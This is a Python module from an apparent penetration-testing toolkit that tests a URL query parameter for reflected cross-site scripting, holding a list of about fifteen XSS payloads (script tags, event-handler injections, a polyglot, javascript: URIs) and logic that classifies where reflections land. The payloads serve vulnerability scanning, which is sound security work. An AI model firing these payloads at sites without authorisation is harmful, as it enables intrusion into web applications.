"""
modules/vuln_scan/xss_tester.py — Reflected XSS parameter injection tester.

Injects a diverse set of XSS payloads into a configurable query parameter
and checks whether the payload appears unencoded in the response body.

Reflection alone does not prove exploitability, so findings are reported as
"potential reflected XSS", annotated with the HTML context (script block,
tag attribute, HTML comment, or body) in which the payload was reflected.
All reflections for a parameter are de-duplicated into a single finding.
"""

import logging

from requests.utils import quote
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from redkit.modules.base_module import BaseModule

logger = logging.getLogger(__name__)

# -----------------------------------------------------------------------
# Diverse XSS payload list (10+ payloads covering various bypass techniques)
# -----------------------------------------------------------------------
XSS_PAYLOADS: list[str] = [
    # Classic
    "<script>alert(1)</script>",
    # Attribute injection
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    # IMG tag
    "<img src=x onerror=alert(1)>",
    # SVG
    "<svg onload=alert(1)>",
    # Case variation bypass
    "<ScRiPt>alert(1)</ScRiPt>",
    # HTML5 autofocus
    "<input autofocus onfocus=alert(1)>",
    # Details / summary (Firefox)
    "<details open ontoggle=alert(1)>",
    # Body event
    "<body onload=alert(1)>",
    # Template literal (for JS context injection)
    "`};alert(1);//",
    # Double-encoded angle bracket
    "%3Cscript%3Ealert(1)%3C/script%3E",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",  # noqa: E501
    # Expression inside style
    "<style>body{background:url('javascript:alert(1)')}</style>",
    # Iframe srcdoc
    '<iframe srcdoc="<script>alert(1)</script>">',
    # Object data
    '<object data="javascript:alert(1)">',
]


class XssTester(BaseModule):
    """Test a query parameter for reflected Cross-Site Scripting (XSS).

    For each payload in XSS_PAYLOADS, sends a GET request with the payload
    injected into the specified parameter and checks if the raw payload
    appears unencoded in the HTML response. Reflections are classified by
    HTML context and reported as a single "potential reflected XSS" finding
    per parameter (HIGH, or MEDIUM when only reflected inside HTML comments).
    """

    name = "XSS Tester"
    description = "Tests a query parameter for reflected XSS via payload injection."
    author = "K4os"
    category = "vuln_scan"

    options = {
        "target": {
            "value": None,
            "required": True,
            "description": "Target URL (e.g. https://example.com/search).",
        },
        "param": {
            "value": None,
            "required": True,
            "description": "Query parameter name to inject into (e.g. q).",
        },
        "timeout": {
            "value": 5,
            "required": False,
            "type": int,
            "description": "HTTP request timeout in seconds (default: 5).",
        },
    }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _reflection_context(body: str, index: int) -> str:
        """Classify the HTML context of a payload reflection.

        Args:
            body: HTTP response body containing the reflected payload.
            index: Character offset of the reflected payload in *body*.

        Returns:
            One of "script", "html-comment", "tag-attribute", or "body".
        """
        before = body[:index]
        before_lower = before.lower()

        # Unclosed <script> block before the reflection → executable JS context
        script_open = before_lower.rfind("<script")
        if script_open != -1 and "</script" not in before_lower[script_open:]:
            return "script"

        # Unclosed HTML comment → inert unless the payload can break out
        comment_open = before.rfind("<!--")
        if comment_open != -1 and "-->" not in before[comment_open:]:
            return "html-comment"

        # Inside a tag (a '<' more recent than any '>') → attribute context
        if before.rfind("<") > before.rfind(">"):
            return "tag-attribute"

        return "body"

    # ------------------------------------------------------------------
    # run()
    # ------------------------------------------------------------------

    def run(self) -> None:
        """Inject each XSS payload and check for unencoded reflection."""
        self.clear_findings()
        self.validate_options()

        target = self.get_option("target")
        param = self.get_option("param")
        http = self.http_client(target)

        logger.info("XSS testing: target=%s, param=%s, payloads=%d", target, param, len(XSS_PAYLOADS))

        # (payload, context) for every unencoded reflection found
        reflected: list[tuple[str, str]] = []

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            transient=False,
        ) as progress:
            task = progress.add_task(f"Testing XSS payloads on {target}", total=len(XSS_PAYLOADS))
            self._progress = progress

            for payload in XSS_PAYLOADS:
                progress.advance(task)
                url = f"{target}?{param}={quote(payload)}"
                try:
                    resp = http.get(url)
                    index = resp.text.find(payload)
                    if index != -1:
                        context = self._reflection_context(resp.text, index)
                        logger.warning("XSS reflected: %s (context: %s)", payload, context)
                        reflected.append((payload, context))
                except Exception as exc:  # noqa: BLE001 — keep scanning remaining payloads
                    logger.debug("Request error for payload '%s': %s", payload, exc)

        # One de-duplicated finding per parameter, covering all reflections.
        if reflected:
            contexts = sorted({context for _payload, context in reflected})
            # Reflection inside an HTML comment is inert unless the payload
            # breaks out of the comment — report as MEDIUM instead of HIGH.
            severity = "MEDIUM" if contexts == ["html-comment"] else "HIGH"
            sample = "\n".join(f"  {payload!r} → context: {context}" for payload, context in reflected[:5])
            logger.warning(
                "XSS reflections confirmed for param '%s': %d payload(s), contexts: %s",
                param,
                len(reflected),
                ", ".join(contexts),
            )
            self.add_finding(
                finding_type="XSS",
                severity=severity,
                title=f"Potential reflected XSS in parameter '{param}'",
                detail=(
                    f"{len(reflected)} of {len(XSS_PAYLOADS)} test payloads were reflected "
                    f"unencoded in the HTTP response body. Contexts observed: "
                    f"{', '.join(contexts)}. Reflection alone does not prove exploitability — "
                    f"manually confirm execution in a browser before treating this as a "
                    f"confirmed vulnerability."
                ),
                evidence=(
                    f"Target: {target} (parameter: {param})\nPayloads reflected: {len(reflected)}\n{sample}"
                ),
                # CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (reflected XSS)
                cvss=6.1,
            )

        total = len(self.get_findings())
        logger.info("XSS testing complete: %d finding(s).", total)
